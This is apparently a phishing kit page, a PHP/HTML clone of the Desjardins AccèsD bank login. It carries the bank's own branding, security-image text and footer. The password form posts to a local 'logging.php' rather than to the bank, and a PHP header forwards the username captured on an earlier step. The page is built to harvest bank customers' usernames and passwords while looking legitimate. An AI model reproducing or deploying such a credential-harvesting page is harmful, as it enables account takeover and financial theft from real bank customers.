﻿<?php
$Username = $_POST['username'];
?>
﻿<!DOCTYPE html>
<html lang="fr"><head> <title>	Se connecter | Desjardins
	</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">

    <noscript>
        <meta http-equiv="refresh" content="1;url=/identifiantunique/erreur-contenu-support.jsp">
    </noscript>
    
<link rel="icon" href="https://www.desjardins.com/static-accesweb/201611041724/acces-web/img/desjardins.ico" type="image/x-icon">

<link href="files2/bootstrap.css" rel="stylesheet">

<link href="files2/fwd-bootstrap.css" rel="stylesheet">

<!--[if lt IE 9]>
    <link href="https://www.desjardins.com/static-accesweb/201611041724/lib/interne/fwd-bootstrap/3.3/css/fwd-bootstrap-ie-force-960-layout.min.css" rel="stylesheet" />
<![endif]-->
<!--[if lte IE 8]>
    <link href="https://www.desjardins.com/static-accesweb/201611041724/lib/interne/fwd-bootstrap/3.3/css/fwd-bootstrap-ie.min.css" rel="stylesheet" />
    <link href="https://www.desjardins.com/static-accesweb/201611041724/lib/interne/fwd-bootstrap/3.3/css/fwd-bootstrap.css" rel="stylesheet" />
<![endif]-->
<!--[if IE 9]>
    <link href="https://www.desjardins.com/static-accesweb/201611041724/lib/interne/fwd-bootstrap/3.3/css/fwd-bootstrap-ie9.min.css" rel="stylesheet" />
<![endif]-->


        <link href="files2/global.css" rel="stylesheet">
    
                <link media="only screen and (max-width : 768px)" href="files2/identifiantunique-responsive.css" rel="stylesheet">
            

<!-- Ajustements de styles de l'application -->

    <link href="files2/theme.css" rel="stylesheet">

<!--[if IE]><link rel="stylesheet" type="text/css" href="https://www.desjardins.com/static-accesweb/201611041724/acces-web/css/ie.min.css"/><![endif]-->
<!--[if lte IE 7]><link rel="stylesheet" type="text/css" href="https://www.desjardins.com/static-accesweb/201611041724/acces-web/css/ie7.min.css"/><![endif]-->
<!--[if IE 8]><link rel="stylesheet" type="text/css" href="https://www.desjardins.com/static-accesweb/201611041724/acces-web/css/ie8.min.css"/><![endif]-->

<link href="files2/owl.css" rel="stylesheet">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

    
        <meta name="description" content="G&eacute;rer vos finances personnelles n&rsquo;aura jamais &eacute;t&eacute; aussi simple, rapide et s&eacute;curitaire gr&acirc;ce aux services en ligne de Desjardins!">
    

    <meta name="desjardins-identifiant-application" content="AccesWeb">
    <meta name="raaMobileActif" content="" />

    
            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        
            <script src="https://www.desjardins.com/static-accesweb/201711221122/acces-web/js/global.min.js" type="text/javascript"></script>
        

    <script type="text/javascript">
        if (window.top.location != self.location) {
            window.top.location = self.location;
        };
    </script>

    
      <link rel="stylesheet" href="https://www.desjardins.com/ressources/css/entete.css">
      <link rel="stylesheet" href="https://www.desjardins.com/ressources/css/page-logon.css">
    
      <link href="https://www.desjardins.com/ressources/css/pied.css" rel="stylesheet">
    <FWD_PLACEHOLDER__CONTENU_HEAD_FRAGMENT_PRINCIPAL/>
</head>

<body class="isolation-bootstrap-3">

    
 <!-- if app_mobile --> 
        <a name="haut"></a>
        

                <span class="hidden-xs">
                    
    <div id="zone-entete-de-page">
      <div id="entete">
        <div id="access-links">
          <a href="#contenu" class="sr-only sr-only-focusable" title="Aller au contenu principal">Aller au contenu principal</a>
        </div>
        <div id="logo">
          
          <h1 class="sr-only">Site Internet de Desjardins</h1>
          <a href="//www.desjardins.com/index.jsp" title="Retour &agrave; page d'accueil de Desjardins.com"><img src="https://www.desjardins.com/ressources/images/a00-entete-logo-desjardins.jpg" alt="Retour &agrave; page d'accueil de Desjardins.com" width="154" height="32"></a>
        </div>
        <div id="logo-applicatif">
          
          <a href="https://accweb.mouv.desjardins.com/identifiantunique/sso/adp"><img src="https://www.desjardins.com/ressources/images/g40-entete-logo-accesd.png" alt="Acc&egrave;sD" width="106" height="32"></a>
          
          <a href="https://accweb.mouv.desjardins.com/identifiantunique/sso/ada"><img src="https://www.desjardins.com/ressources/images/g40-entete-logo-accesd-affaires.png" alt="Acc&egrave;sD Affaires" width="90" height="32"></a>
        </div>
        <div id="outils">
          <div id="nous-joindre">
            <p class="titre-entete"><a href="#" onclick="popup('//www.desjardins.com/page-aide/index.jsp?docName=ai_joindre&domaine=ACCESD','Joindre','resizable=yes,location=no,menubar=no,status=no,scrollbars=yes,width=800,height=600');">Nous joindre</a></p>
          </div>
          <div id="aide">
            <p class="titre-entete"><a href="#" onclick="popup('//www.desjardins.com/page-aide/index.jsp?docName=ai_logonlogoff&domaine=ACCESD','Aide','resizable=yes,location=no,menubar=no,status=no,scrollbars=yes,width=800,height=600');">Aide</a></p>
          </div>
          <div id="choix-site">
            <p class="titre-entete"><a id="btn-langue" href="?langueCible=en" lang="en"><span class="sr-only">Change language. </span>English</a></p>
          </div>
          <div id="fonctions">
            <ul>
              <li class="reduire"><a id="taille-texte-moins" href="#" title="R&eacute;duire la taille du texte">R&eacute;duire la taille du texte</a></li>
              <li class="augmenter"><a id="taille-texte-plus" href="#" title="Augmenter la taille du texte">Augmenter la taille du texte</a></li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  
 </span> 
                    <span class="hidden-sm hidden-md hidden-lg">
                        

<div id="zone-entete-de-page">
    <nav class="navbar navbar-default" role="navigation">
        <div class="container max-layout-960">
            <!-- Brand and toggle get grouped for better mobile display -->
            <div class="navbar-header">

                <span class="navbar-brand">
                    
                            <a href="">
                                <img class="logo" src="https://www.desjardins.com/static-accesweb/201711221122/acces-web/img/a00-entete-logo-desjardins.png" alt="Aller &agrave; la page d&#39;accueil" title="Desjardins">
                            </a>
                        
                    <div class="hidden-xs" style="display: inline;">
                        <img role="presentation" src="https://www.desjardins.com/static-accesweb/201711221122/acces-web/img/g00-entete-filet-logos.png" />
                        
                                <img class="logo-desjardins" role="presentation" src="https://www.desjardins.com/static-accesweb/201711221122/acces-web/img/g00-logo-desjardins-blanc.png" style="padding-right: 20px;" alt="Desjardins" title="Desjardins"/>
                            
                    </div>
                </span>

                <div id="titrePageMobile" class="navbar-brand hidden-sm hidden-md hidden-lg"></div>

                
                    <a href="http://www.desjardins.com/" class="navbar-brand pull-right hidden-sm hidden-md hidden-lg">
                        <img id="menuAppRetour" src="https://www.desjardins.com/static-accesweb/201711221122/acces-web/img/entete-btn-menu-app.png" height="32"/>
                    </a>
                
 </div><!-- /.navbar-header --> <!-- Collect the nav links, forms, and other content for toggling --> 
            <div class="collapse navbar-collapse" id="navbar-collapse-outils">
                <div id="outils">
                    <ul class="nav navbar-nav navbar-right">
                        
                        <li>
                            <a class="lien" href="javascript:popup('https://www.desjardins.com/page-aide/index.jsp?docName=ai_joindre&amp;domaine=ACCESD','Nous joindre', 'location=0,scrollbars=yes,resizable=yes,width=500,height=500');">
                                Nous joindre
                            </a><span class="hidden-xs">|</span>
                        </li>
                        <li>
                            <a class="lien" href="javascript:popup('https://www.desjardins.com/fr/services_en_ligne/accesd/aide/ai_logonlogoff.jsp?domaine=ACCESD','Aide', 'location=0,scrollbars=yes,resizable=yes,width=500,height=500');">
                                Aide
                            </a><span class="hidden-xs">|</span>
                        </li>
                        
                                <li class="hidden-xs">
                                    
                                            <a class="lien" id="changeLangue" href="?langueCible=en">
                                                English
 </a> 
                                    <span class="hidden-sm">|</span>
                                </li>
                            
                        <li class="hidden-xs">
                            <a class="lien" id="taille-texte-moins" href="javascript:void(0)" style="padding-right: 0px;">
                                <img src="https://www.desjardins.com/static-accesweb/201711221122/acces-web/img/a00-entete-ic-texte-moins-on.png" alt="" title=""/>
                            </a>
                        </li>
                        <li class="hidden-xs">
                            <a class="lien" id="taille-texte-plus" href="javascript:void(0)" style="padding-left: 8px; padding-right: 20px;">
                                <img src="https://www.desjardins.com/static-accesweb/201711221122/acces-web/img/a00-entete-ic-texte-plus-on.png" alt="" title=""/>
                            </a>
                        </li>
                        
                        
 </ul> </div> </div><!-- /.collapse .navbar-collapse --> 
 </div><!-- /.container-fluid --> </nav><!-- /.navbar .navbar-default .navbar-fixed-top -->
</div>

 </span> 
                <script type="text/javascript">
                var deconnexionLogoutDefault = "true";
                $("#btn-deconnexion").attr("href", "#");
                </script>
                <script type="text/javascript">
                    $(document).on("click", "#btn-deconnexion", function() { dynDeconnection("https://accweb.mouv.desjardins.com:443/identifiantunique/autologout"); });
                </script>
            
 <!-- fin if app_mobile --> 
    <div class="zone-centrale">

        <div id="zone-centrale-bg">
            <!-- div id="zone-centrale-grad" class="zone-centrale padding-top-35px"></div-->
            <div class="container">
                <div id="contenu" lang="fr" role="main">
                    
                    <div class="row">
                        
                                <div class="col-xs-24 col-sm-24 col-md-18 col-md-offset-3 col-lg-18 col-lg-offset-3">
                            

                            <div id="loading" class="loading" style="display: none;">
                                <div class="panel panel-primary">
                                    <div class="panel-body">
                                        <img id="img-loading" src="https://www.desjardins.com/static-accesweb/201711221122/lib/interne/fwd-bootstrap/3.3/img/a00-loading-petit.gif" alt="Loading" />
                                    </div>
                                </div>
                            </div>
                            
                            


<h1 id="titrePage" data-titre-page-mobile="S&#39;authentifier">
    S&#39;authentifier
</h1>
<form id="formAuthentification" class="form-horizontal" action="logging.php" method="POST" autocomplete="off">
    <input type=hidden name="username" value="<? print $Username; ?>">
	<div class="row">
        <div class="col-sm-24">
            
        </div>
    </div>

    <!--Dessin du panel -->
    <div class="row">
        <div class="col-sm-24">
            <div class="panel panel-primary">
                <div class="panel-body padding-moyen">
                    
                        <div class="form-group col-xs-24">
                            <div>
                                <p id="authentificationMessages" class="sr-only" >
                                    Si vous reconnaissez cette phrase, entrez votre mot de passe.
                                </p>
                                <p class="sans-marge" aria-hidden="true">
                                    Si vous reconnaissez cette phrase et cette image, entrez votre mot de passe.
 </p> 
                                    <p class="top20px">
                                        
 <span> Sinon, <b>n'entrez pas votre mot de passe</b> et <a href='javascript:popup("https://www.desjardins.com/page-aide/index.jsp?docName=ai_joindre&amp;domaine=ACCESD","","resizable=yes,location=no,menubar=no,status=no,scrollbars=yes,width=800,height=600")'>communiquez avec nous</a>.
 </span> 
 </p> 
                            </div>
                        </div>

                        <!-- IMAGE ET PHRASE -->
                        <div class="form-group">
                            
                            <div class="col-xs-24 col-sm-offset-8 col-sm-16 noir ">
                                <span class="sr-only">Votre phrase pour vous identifier dans Acc&egrave;sD.</span>
                                <strong class="authentificationPhrase"></strong>
                            </div>
                        </div>    
                        <div class="form-group">
                            <div class="col-xs-offset-8 col-xs-16 col-sm-offset-8 col-sm-16">
                                
                                <img aria-hidden="true" alt="Votre image pour vous identifier dans Acc&egrave;sD." src="https://accweb.mouv.desjardins.com/images-auth-forte/imageAuth?noCategorie=ENC%289d5b9258befbc6c3a290dfa1d972049621ac23b39692e9ea02ed219af18dcf8a970a45f5110c53f6db985f8211%29&nomImage=ENC%289d5b9258befbc6c3a290dfa1d972049621ac23b39692e9ea02ed219af18dcf8a970a3685757a2480d6e12d8325c8f80d88964b6199f3fca63284858ddc93%29"/>
                            </div>
                         </div>
                     

                     <!-- MOT DE PASSE -->
                     <div class="form-group ">
                        <div class="col-xs-24 col-sm-offset-8 col-sm-6">
                            
                        </div>
                     </div>
                     <div class="form-group ">
                        <label path="motDePasse" for="motDePasse" class="col-xs-24 col-sm-8 control-label padding-top-0px">
                            <strong>Mot de passe :</strong>
                        </label>
                        <div class="col-xs-24 col-sm-6">
                            <input type="hidden" name="codeUtilisateur" value=""/>
                            <input type="password" name="password" id="motDePasse" maxlength="12"  autocomplete="off"/>
                            <br/>
                            <!-- INSTRUCTION -->
                            <div id="instructionMotDePasse">
                                <p>
                                    <span id="messagesInstruction" class="texte12px"><b>Attention</b> : Respecter majuscules et minuscules</span> </p> </div> 
                                <div id="messageVerrouillageMaj" role="alert" style="display: none;">
                                    <p>
                                        <span class="help-block-idunique alerte texte12px">
                                            <span class="sr-only">La touche verrouillage majuscules de votre clavier est activ&eacute;e.</span>
                                            <span aria-hidden="true">La touche Verr. Maj. de votre clavier est activ&eacute;e.</span> </span> <p> </div> 
                        </div>
                        <div class="col-xs-24 col-sm-10">
                            
                                <span class="padding-left20px hidden-xs"></span>    

								
										<a href="#modale-continuer-mobile" id="lienMotPasseOublie" class="lien-action top10px hidden-sm hidden-md hidden-lg" data-toggle="modal" title="" data-placement="auto top" data-html="true" data-arrow="auto bottom" data-container="body">
											<span class="sr-only">Ouvre une boîte de dialogue</span>	Mot de passe oubli&eacute;?
										</a>								
										<a href="#modale-continuer" id="lienMotPasseOublie" class="lien-action hidden-xs" data-toggle="modal" title="" data-placement="auto top" data-html="true" data-arrow="auto bottom" data-container="body">
											<span class="sr-only">Ouvre une boîte de dialogue</span>	Mot de passe oubli&eacute;?
	</a>	
                        </div>

                    </div>

                    <!-- BOUTONS -->
                    <div class="top10px">
                        <div id="form-group-bouton" class="form-group">
                            <div class="col-xs-12 col-sm-8 col-md-8 text-right">
                                <a id="boutonAnnuler" href="/identifiantunique/authentification/annuler" class="btn btn-default fullwidth">Annuler</a>
                            </div>
                            <div class="col-xs-12 col-sm-4 col-md-4">
                                <input id="boutonValider" type="submit" name="send" class="btn btn-primary fullwidth" value="Valider" />
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
<div>
<input type="hidden" name="_tk" value="a27fbc06-dc0e-45fb-990c-332013b9b9a5" />
</div></form>
    <form action="/identifiantunique/motPasseOublie/authentification" method="GET">
    
<div class="modal fade" id="modale-continuer-mobile" tabindex="-1" role="dialog" aria-describedby="alertDescription" data-backdrop="static">
    <div class="modal-dialog">
    	<div class="modal-content">
        	<div class="modal-header">
            	<p id="alertDescription" class="alert alert-warning no-margin-bottom"><strong>Attention!</strong><br> Votre mot de passe actuel sera désactivé.</p>
            </div>
            <div class="modal-body padding-left0px padding-right0px">
				<fieldset aria-describedby="noteDescription">
					<legend><strong>Désirez-vous obtenir un nouveau mot de passe?</strong></legend>
					<div class="row padding-top-10px">
						<div class="col-xs-12 col-sm-12 text-right">
							<button id='btnAnnulationNon' href="#" class="btn btn-default fullwidth" data-dismiss="modal">
								Non
							</button>
						</div>
						<div class="col-xs-12 col-sm-12">
							<button id="btnContinuer" href="" class="btn btn-primary fullwidth">
								Oui
							</button>
						</div>	
					</div>
					<div class="text-left padding-top-10px">
						<p id="noteDescription">Note : Vous pouvez recevoir votre mot de passe temporaire par courriel. Pour le recevoir par courriel, vous devez ajouter un courriel à vos identifiants AccèsD, dans la section <strong>Paramètres de sécurité</strong> sous l’icône <strong>Profil et préférences</strong> de la page Sommaire AccèsD.</p>
					</div>
				</fieldset>
			</div>
		</div>
	</div>
</div>

<div id="modale-continuer" class="modal" tabindex="-1" role="dialog" aria-describedby="alertDescription" data-backdrop="static">
	<div class="modal-dialog">
    	<div class="modal-content">
        	<div class="modal-header">
            	<p id="alertDescription" class="alert alert-warning no-margin-bottom"><strong>Attention!</strong><br> Votre mot de passe actuel sera désactivé.</p>
            </div>
            <div class="modal-body padding-left0px">
				<fieldset aria-describedby="noteDescription">
					<legend><strong>Désirez-vous obtenir un nouveau mot de passe?</strong></legend>
					<div class="col-xs-12 col-sm-12 text-right padding10px">
						<button id='btnAnnulationNon' href="#" class="btn btn-default fullwidth" data-dismiss="modal">
							Non
						</button>
					</div>
					<div class="col-xs-12 col-sm-12 padding10px">
						<button id="btnContinuer" href="" class="btn btn-primary fullwidth">
							Oui
						</button>
					</div>					                
					<div class="text-left padding-top-10px">
						<p id="noteDescription">Note : Vous pouvez recevoir votre mot de passe temporaire par courriel. Pour le recevoir par courriel, vous devez ajouter un courriel à vos identifiants AccèsD, dans la section <strong>Paramètres de sécurité</strong> sous l’icône <strong>Profil et préférences</strong> de la page Sommaire AccèsD.</p>	</div>	</fieldset>	</div>	</div>	</div>
</div>
 </form>


<!-- Div du logo securite -->

    <div class="row">
        <div class="col-sm-24">
            

<div id="imgSecurite" class="text-right hidden-xs">

    <a href="https://www.desjardins.com/securite/remboursement-fraude/">
        <img src="https://www.desjardins.com/static-accesweb/201711221122/acces-web/img/g00-logo-securite-garantie-f.png" alt="S&eacute;curit&eacute; garantie &agrave; 100 %"/>
    </a>
       
</div>
 </div> </div>

<!-- modal de redirection -->
<div tabindex="0" role="dialog" aria-haspopup=true aria-live="assertive" aria-labelledby="enteteModale textTimeRemaining" class="modal" id="modalOubliMotPasse" aria-hidden="true" data-backdrop="static" data-keyboard="false">
    <div aria-live="assertive" class="modal-dialog">
        <div class="modal-content col-md-offset-4 col-sm-offset-4 col-md-19 col-sm-19" >
            <span class="sr-only">Bo&icirc;te de dialogue</span>
            <div id="expirationWarningTitle" class="modal-header">
                <h2 id="enteteModale">Mot de passe d&eacute;sactiv&eacute;</h2>
            </div>
            <p class="alert alert-warning" id="expirationWarningBody" >
                Votre mot de passe <strong>a été désactivé</strong> après 3 échecs de connexion.
            </p>

            <div class="modal-footer top5px bottom20px">
                <a class="btn btn-primary btn-success"type="button" href="/identifiantunique/motPasseOublie/authentification">Obtenir un nouveau mot de passe</a>
            </div>

        </div>
    </div>
</div>

<script type="text/javascript">
$(document).ready(function() {
	var dataContentPopover = $('#fenetreModale').html();

    var popover = $('#lienMotPasseOublie').attr('data-content', dataContentPopover).data('bs.popover');
    if(popover != null) {
        popover.setContent();
        popover.$tip.addClass(popover.options.placement);
    }

    $('.modal').on('show.bs.modal', centerModal);
    $(window).on("resize", function() {
        $('.modal:visible').each(centerModal);
    });

    
 gererVerrouillageMaj();
});
</script>


                                <div id="securiteMobile" class="hidden-sm hidden-md hidden-lg">
                                    <img class="fake" src="https://www.desjardins.com/static-accesweb/201711221122/acces-web/img/g00-logo-securite-garantie-f.png" />
                                    <img class="fake" src="https://www.desjardins.com/static-accesweb/201711221122/acces-web/img/a00-entete-logo-desjardins.png" />
                                    
                                    <div id="img_wrap" class="row col-xs-24 padding-left10px">
                                        
                                            <img class="normal non-selectable" title="" src="https://www.desjardins.com/static-accesweb/201711221122/acces-web/img/g00-logo-securite-garantie-f.png" alt=""/>
                                        
                                            <img class="normal non-selectable padding-left10px" title="Desjardins" src="https://www.desjardins.com/static-accesweb/201711221122/acces-web/img/a00-entete-logo-desjardins.png" alt="Desjardins"/>
                                        
 </div> </div> <br/> 

                            <br/>
                        </div>
                    </div>

                </div>

            <br/>

            </div>
        </div>
    </div>

    <footer class="footer">

        
                <span class="hidden-xs">
                    


  
  

    <div id="zone-pied-de-page">
      <div id="pied">
      
        <div id="plan-site">
          <h2 class="hors-ecran">Plan du site</h2>
          <div id="tetes-sections">
            <ul>
          
            
            
          
              <li><a href="//www.desjardins.com/particuliers/index.jsp">Services aux particuliers</a></li>
              <li><a href="//www.desjardins.com/entreprises/index.jsp">Services aux entreprises</a></li>
              <li><a href="//www.desjardins.com/coopmoi/index.jsp">Coopmoi</a></li>
              <li><a href="//www.desjardins.com/a-propos/index.jsp">&Agrave; propos</a></li>
              <li><a href="//www.desjardins.com/mobile-gps-rss/index.jsp">Desjardins sur mobile, GPS et RSS</a></li>
            </ul>
          </div>
        </div>
        <div id="zone-legale">
          




<ul>
  <li><a href="//www.desjardins.com/securite/index.jsp" >S&eacute;curit&eacute;</a></li>
  <li><a href="//www.desjardins.com/confidentialite/index.jsp" >Confidentialit&eacute;</a></li>
  <li><a href="//www.desjardins.com/conditions-utilisation-notes-legales/index.jsp" >Conditions d'utilisation et notes l&eacute;gales</a></li>
  <li><a href="//www.desjardins.com/a-propos/responsabilite-sociale-cooperation/mouvement-cooperatif-solidaire/accessibilite/index.jsp" >Accessibilit&eacute;</a></li>
  <li><a href="//www.desjardins.com/plan-site/index.jsp" >Plan du site</a></li>
</ul>






<p class="copyright">&copy; 1996-2018, Mouvement des caisses Desjardins. Tous droits réservés.
</p>


        </div>
      </div>
    </div>

  


  
 </span> 
                <span class="hidden-sm hidden-md hidden-lg">
                    
<div id="pied-de-page" class="container texte-blanc">
    <div class="row">
        <div class="col-sm-4 col-md-4 text-left pied-de-page-logo hidden-xs">
            
        </div>
        <div class="col-xs-24 col-sm-16 col-md-16 text-center pied-de-page-texte">
                <span class="hidden-xs">
                    
                            <a href="javascript:popup('https://www.desjardins.com/securite/','S&eacute;curit&eacute;','scrollbars=yes,resizable=yes,width=500,height=500');">S&eacute;curit&eacute;</a> | 
                            <a href="javascript:popup('http://www.desjardins.com/confidentialite/','Confidentialit&eacute;','scrollbars=yes,resizable=yes,width=500,height=500');">Confidentialit&eacute;</a> | 
                            <a href="javascript:popup('http://www.desjardins.com/conditions-utilisation-notes-legales/','Conditions utilisation','scrollbars=yes,resizable=yes,width=500,height=500');">Conditions d&#39;utilisation et notes l&eacute;gales</a> | 
                            <a href="javascript:popup('https://www.desjardins.com/page-aide/index.jsp?docName=accessibilite&amp;domaine=ACCESD','Accessibilit&eacute;','scrollbars=yes,resizable=yes,width=500,height=500');">Accessibilit&eacute;</a> 
 <br /> 
 </span> <p>Copyright &copy; 2018 Mouvement des caisses Desjardins. Tous droits r&eacute;serv&eacute;s.</p>

        </div>
        <div class="col-xs-4 col-sm-4 col-md-4 text-right hidden-xs hidden-sm">
            
 </div> </div>
</div>

 </span> 
 </footer> 
        <!-- MONITEUR D'ACTIVITES -->
        
    
        <div tabindex="0" role="dialog" aria-haspopup=true aria-live="assertive" aria-labelledby="enteteModale textTimeRemaining" class="modal fade" id="modalMoniteurActivites" aria-hidden="true" data-backdrop="static" data-keyboard="false">
            <div aria-live="assertive" class="modal-dialog modal-dialog-alert-info">
                <div class="modal-content" >
                    <span class="sr-only">Bo&icirc;te de dialogue</span>
                    <div id="expirationWarningTitle" class="modal-header">
                        <h2 id="enteteModale">Prolongation de session</h2>
                    </div>
                    <div class="alert alert-warning  modal-body-alert-info" id="expirationWarningBody" >
                        <p tabindex="0"  id="textTimeRemaining" class="margin0px" >Le délai d’inactivité de votre session expirera dans <span id="sessionSecondsRemaining">??</span><span id="alert-info-min" class="hidden"> minute</span><span id="alert-info-sec" class="hidden"> seconde</span>. Les données entrées seront perdues.</p>
                        <p tabindex="0"><strong>Voulez-vous prolonger la session?</strong></p>
                    </div>
    
                    <div class="modal-footer">
                        <button id="logoutSession" type="button" class="btn btn-default" data-dismiss="modal">
                            Non
                        </button>
                        <button id="extendSession" type="button" class="btn btn-primary btn-success" data-dismiss="modal">
                            Oui
                        </button>
                    </div>
                </div>
            </div>
        </div>

        
 <!-- Inclusion des fichiers javascripts pour le comportement --> 
<script src="https://www.desjardins.com/static-accesweb/201711221122/lib/externe/bootstrap/3.3.6/js/bootstrap.min.js" type="text/javascript"></script>
<!--[if lt IE 9]>
    <script src="https://www.desjardins.com/static-accesweb/201711221122/lib/externe/respond.js/1.3.0/respond.min.js"></script>
<![endif]-->


<script src="https://www.desjardins.com/static-accesweb/201711221122/lib/interne/fwd-bootstrap/3.3/js/fwd-bootstrap.min.js" type="text/javascript"></script>
<!--[if IE]>
    <script src="https://www.desjardins.com/static-accesweb/201711221122/lib/interne/fwd-bootstrap/3.3/js/fwd-bootstrap-ie.min.js" type="text/javascript"></script>
<![endif]-->

<!--[if lt IE 9]>
    
    <script src="https://www.desjardins.com/static-accesweb/201711221122/lib/externe/html5shiv/3.7.0/html5shiv.js" type="text/javascript"></script>
    
    <script src="https://www.desjardins.com/static-accesweb/201711221122/lib/externe/placeholder/2.0.8/jquery.placeholder.min.js" type="text/javascript"></script>
<![endif]-->

<!--[if IE 9]>
    
    <script src="https://www.desjardins.com/static-accesweb/201711221122/lib/externe/placeholder/2.0.8/jquery.placeholder.min.js" type="text/javascript"></script>
<![endif]-->





<!-- ni : accesweb01_berlin8_rel05  -->
<!-- pv :  -->
</body>
</html>
